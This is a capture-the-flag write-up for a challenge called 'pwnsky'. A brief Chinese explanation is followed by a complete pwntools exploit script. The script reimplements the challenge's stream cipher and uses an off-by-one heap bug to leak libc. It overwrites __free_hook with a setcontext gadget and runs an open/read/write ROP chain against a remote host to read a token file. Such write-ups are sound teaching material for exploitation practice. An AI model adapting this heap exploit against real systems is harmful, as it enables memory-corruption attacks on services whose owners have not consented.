# pwnsky



## 思路

取出程序中所有花指令，花指令在加密算法和add堆块函数中，使其F5能够反编译出正确的伪代码，先逆向流密码加密，很简单，秩只需把加密算法还原，就是解密算法了，然后接着就是进行普通堆利用了，去掉在add函数中只要满足data[0] == "\x00"的话，那么就出现off by one漏洞，通过该漏洞去实现一个堆块合并，修改__free_hook为setcontext的gadget，实现堆栈迁移，在堆中实现orw。

lua编译工具:https://github.com/viruscamp/luadec



## Exp


```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
from pwn import *
from sys import *
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
#context(arch = 'amd64', os = 'linux', log_level='debug')
exeFile  = "./pwn"
libFile  = "./libc.so.6"
LOCAL = 0
LIBC = 1

XorTable = [
        0xbe, 0xd1, 0x90, 0x88, 0x57, 0x00, 0xe9, 0x53, 0x10, 0xbd, 0x2a, 0x34, 0x51, 0x84, 0x07, 0xc4, 
        0x33, 0xc5, 0x3b, 0x53, 0x5f, 0xa8, 0x5d, 0x4b, 0x6d, 0x22, 0x63, 0x5d, 0x3c, 0xbd, 0x47, 0x6d, 
        0x22, 0x3f, 0x38, 0x4b, 0x7a, 0x4c, 0xb8, 0xcc, 0xb8, 0x37, 0x78, 0x17, 0x73, 0x23, 0x27, 0x71, 
        0xb1, 0xc7, 0xa6, 0xd1, 0xa0, 0x48, 0x21, 0xc4, 0x1b, 0x0a, 0xad, 0xc9, 0xa5, 0xe6, 0x14, 0x18, 
        0xfc, 0x7b, 0x53, 0x59, 0x8b, 0x0d, 0x07, 0xcd, 0x07, 0xcc, 0xbc, 0xa5, 0xe0, 0x28, 0x0e, 0xf9, 
        0x31, 0xc8, 0xed, 0x78, 0xf4, 0x75, 0x60, 0x65, 0x52, 0xb4, 0xfb, 0xbf, 0xac, 0x6e, 0xea, 0x5d, 
        0xca, 0x0d, 0xb5, 0x66, 0xac, 0xba, 0x06, 0x30, 0x95, 0xf4, 0x96, 0x42, 0x7a, 0x7f, 0x58, 0x6d, 
        0x83, 0x8e, 0xf6, 0x61, 0x7c, 0x0e, 0xfd, 0x09, 0x6e, 0x42, 0x6b, 0x1e, 0xb9, 0x14, 0x22, 0xf6, 

        0x16, 0xd2, 0xd2, 0x60, 0x29, 0x23, 0x32, 0x9e, 0xb4, 0x82, 0xee, 0x58, 0x3a, 0x7d, 0x1f, 0x74, 
        0x98, 0x5d, 0x17, 0x64, 0xe4, 0x6f, 0xf5, 0xad, 0x94, 0xaa, 0x89, 0xe3, 0xbe, 0x98, 0x91, 0x38, 
        0x70, 0xec, 0x2f, 0x5e, 0x9f, 0xc9, 0xb1, 0x26, 0x3a, 0x64, 0x48, 0x13, 0xf1, 0x1a, 0xc5, 0xd5, 
        0xe5, 0x66, 0x11, 0x11, 0x3a, 0xaa, 0x79, 0x45, 0x42, 0xb4, 0x57, 0x9d, 0x3f, 0xbc, 0xa3, 0xaa, 
        0x98, 0x4e, 0x6b, 0x7a, 0x4a, 0x2f, 0x3e, 0x10, 0x7a, 0xc5, 0x33, 0x8d, 0xac, 0x0b, 0x79, 0x33, 
        0x5d, 0x09, 0xfc, 0x9d, 0x9b, 0xe5, 0x18, 0xcd, 0x1c, 0x7c, 0x8b, 0x0a, 0xa8, 0x95, 0x56, 0xcc, 
        0x4e, 0x34, 0x31, 0x33, 0xf5, 0xc1, 0xf5, 0x03, 0x0a, 0x4a, 0xb4, 0xd1, 0x90, 0xf1, 0x8f, 0x57, 
        0x20, 0x05, 0x0d, 0xa0, 0xcd, 0x82, 0xb3, 0x25, 0xd8, 0xd2, 0x20, 0xf3, 0xc5, 0x96, 0x35, 0x35, 
    ]


def Encode(keys, data):
    key_arr = []
    raw_key = []
    data_arr = []
    for c in keys:
        key_arr.append(c)
        raw_key.append(c)

    for c in data:
        data_arr.append(c)
    keys = key_arr
    data = data_arr

    for i in range(len(data)):
        n = ((keys[i & 7] + keys[(i + 1) & 7]) * keys[(i + 2) & 7] + keys[(i + 3) & 7]) & 0xff
        data[i] ^= n ^ XorTable[n]
        keys[i & 7] = (n * 2 + 3) & 0xff
        if((i & 0xf) == 0):
            keys = KeyRandom(raw_key, XorTable[i & 0xff])

    out = b''
    for c in data:
        out += c.to_bytes(1, byteorder='little')
    return out

def KeyRandom(raw_key, seed):
    out_key = []
    for c in range(8):
        out_key.append(0)

    for i in range(8):
        out_key[i] = (raw_key[i] ^ XorTable[raw_key[i]]) & 0xff;
        out_key[i] ^= (seed + i) & 0xff;
    return out_key


if(LOCAL == 0):
    if(len(argv) < 3):
        print('Usage: python2 ./exp.py [host] [port]')
        exit(-1)
    host = argv[1]
    port = int(argv[2])

def add(size, text):
    io.sendlineafter('$', 'add')
    io.sendlineafter('?', str(size))
    sleep(0.2)
    io.send(text)

def delete(idx):
    io.sendlineafter('$', 'del')
    io.sendlineafter('?', str(idx))

def get(idx):
    io.sendlineafter('$', 'get')
    io.sendlineafter('?', str(idx))

def quit():
    io.sendlineafter('$', 'exit')

def login(acc, pas):
    io.sendlineafter('$', 'login')
    io.sendlineafter(':', str(acc))
    io.sendlineafter(':', str(pas))

def code(d):
    a = 0
    
#--------------------------Exploit--------------------------
def exploit():
    io.sendlineafter(':', 'team_test')
    io.sendlineafter(':', 'i0gan')
    #6b8b4567327b23c6
    key = p64(0x6b8b4567327b23c6)

    login(1000, 418894113)

    add(0x320, '\n') # 0
    add(0x320, '\n') # 1

    delete(1)
    delete(0)

    add(0x320, '\n') # 0
    get(0)
    io.recvuntil('\n')
    heap = u64(io.recv(6).ljust(8, b'\x00')) - 0xa
    print('heap: ' + hex(heap))
    delete(0)

    add(0x500, '\n') # 0
    add(0x500, '\n') # 1

    delete(0)

    add(0x500, '\n') # 0
    get(0)
    io.recvuntil('\n')
    leak = u64(io.recv(6).ljust(8, b'\x00')) + 0x80 - 10
    libc_base = leak - libc.sym['__malloc_hook'] - 0x10
    print('leak: ' + hex(leak))
    print('libc_base: ' + hex(libc_base))
    
    free_hook = libc_base + libc.sym['__free_hook']
    setcontext = libc_base + libc.sym['setcontext'] + 61
    ret = libc_base + 0x25679

    libc_open = libc_base + libc.sym['open']
    libc_read = libc_base + libc.sym['read']
    libc_write = libc_base + libc.sym['write']
    pop_rdi = libc_base + 0x26b72
    pop_rsi = libc_base + 0x27529
    pop_rdx_r12 = libc_base + 0x000000000011c371 # pop rdx ; pop r12 ; ret
    gadget = libc_base + 0x154930 # local

    add(0x80, '\n') # 2
    add(0x20, '\n') # 3


    b = 3
    j = 20
    for i in range(b, j):
        add(0x20, 'AAA\n')

    for i in range(b + 10, j):
        delete(i)

    add(0x98, Encode(key, b'AAA') + b'\n') # 13
    add(0x500, Encode(key, b'AAA') + b'\n') # 14
    add(0xa0, 'AAA\n') # 15
    add(0xa0, 'AAA\n') # 16
    add(0xa0, 'AAA\n') # 17

    delete(13)

    delete(17)
    delete(16)
    delete(15)
    # releak heap
    add(0xa8, b'\n') # 13
    get(13)

    io.recvuntil('\n')
    heap = u64(io.recv(6).ljust(8, b'\x00')) - 0xa  + 0x200 - 0x90 # remote
    #heap = u64(io.recv(6).ljust(8, b'\x00')) - 0xa  + 0x200 # local

    delete(13)

    p = b'\x00' + b'\x11' * 0x97
    add(0x98, Encode(key, p) + b'\xc1') # 13

    delete(14)
    # 5c0
    p = b'A' * 0x500
    p += p64(0) + p64(0xb1)
    p += p64(libc_base + libc.sym['__free_hook']) + p64(0)
    add(0x5b0, Encode(key, p) + b'\n') # 14
    # releak heap
    add(0xa8, Encode(key, b"/bin/sh\x00") + b'\n') # 13
    add(0xa8, Encode(key, p64(gadget)) + b'\n') # modify __free_hook as a gadget set rdi -> rdx

    p =  p64(1) + p64(heap) # set to rdx
    p += p64(setcontext)
    p = p.ljust(0x90, b'\x11')
    p += p64(heap + 0xb0) # rsp
    p += p64(ret) # rcx

    rop  = p64(pop_rdi) + p64(heap + 0xb0 + 0x98 + 0x18)
    rop += p64(pop_rsi) + p64(0)
    rop += p64(pop_rdx_r12) + p64(0) + p64(0)
    rop += p64(libc_open)

    rop += p64(pop_rdi) + p64(3)
    rop += p64(pop_rsi) + p64(heap)
    rop += p64(pop_rdx_r12) + p64(0x80) + p64(0)
    rop += p64(libc_read)

    rop += p64(pop_rdi) + p64(1)
    rop += p64(libc_write)

    rop += p64(pop_rdi) + p64(0)
    rop += p64(libc_read)

    p += rop
    p += b'./sky_token\x00'

    add(0x800, Encode(key, p) + b'\n') # 13

    #print('heap: ' + hex(heap))

    print('get flag...')
    print('heap: ' + hex(heap))
    #gdb.attach(io)
    delete(17)

    
if __name__ == '__main__':
    if LOCAL:
        exe = ELF(exeFile)
        if LIBC:
            libc = ELF(libFile)
            io = exe.process()
            #io = exe.process(env = {"LD_PRELOAD" : libFile})
        else:
            io = exe.process()
    else:
        exe = ELF(exeFile)
        io = remote(host, port)
        if LIBC:
            libc = ELF(libFile)
    
    exploit()
    io.interactive()

```



